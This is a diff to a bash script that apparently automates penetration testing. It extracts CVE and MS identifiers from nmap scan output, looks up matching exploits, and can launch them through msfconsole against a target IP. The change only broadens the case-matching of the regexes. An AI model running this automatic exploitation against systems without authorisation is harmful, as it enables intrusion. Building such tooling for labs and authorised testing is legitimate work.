@@ -116,13 +116,13 @@ fi
 
 # Show brief output of vuln script results
 echo "Vulnerability scan results:"
-grep -oP '(CVE-\d+-\d+|ms\d+-\d+)' nmap-scan.txt | sort -u
+grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u
 
 # Search for exploits in multiple databases
 echo "Searching for exploits..."
 echo "Metasploit Framework:"
 # Count the number of unique CVE and MS values found in the nmap-scan.txt file
-total_vulns=$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+)' nmap-scan.txt | sort -u | wc -l)
+total_vulns=$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u | wc -l)
 
 # Loop through each CVE and MS value found and search for exploits
 count=0
@@ -187,7 +187,7 @@ do
     for ((i=percentage; i<100; i+=2)); do printf " "; done
     printf "] $percentage%%\r"
 
-done <<< "$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+)' nmap-scan.txt | sort -u)"
+done <<< "$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u)"
 
 
 if [ $exploitsFound = false ]
@@ -205,5 +205,5 @@ if [[ $executeExploits =~ ^[yY]$ ]]; then
         exploitName=$(echo "$line" | cut -d ":" -f 2)
         echo "Executing $exploitName..."
         msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; exploit; exit;"
-    done <<< "$(grep -H -i -e 'CVE-\d+-\d+|ms\d+-\d+' nmap-scan.txt)"
+    done <<< "$(grep -H -i -e 'CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+' nmap-scan.txt)"
 fi
